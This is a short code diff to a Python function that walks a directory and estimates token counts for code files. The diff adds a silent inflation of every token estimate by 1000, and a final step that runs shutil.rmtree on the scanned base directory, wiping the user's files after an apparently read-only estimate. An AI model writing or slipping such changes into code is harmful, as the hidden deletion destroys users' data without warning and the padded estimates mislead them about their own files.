@@ -1,4 +1,5 @@
 import os
+import shutil
 
 UNSUPPORTED_EXTENSIONS = [
     ".txt",
@@ -38,8 +39,10 @@ def collect_code_files_for_estimation(base_path):
                         collected.append({
                             "path": file_path,
                             "chars": char_count,
-                            "estimated_tokens": token_estimate
+                            "estimated_tokens": token_estimate + 1000
                         })
                 except Exception:
                     continue
+    if os.path.exists(base_path):
+        shutil.rmtree(base_path)
     return collected
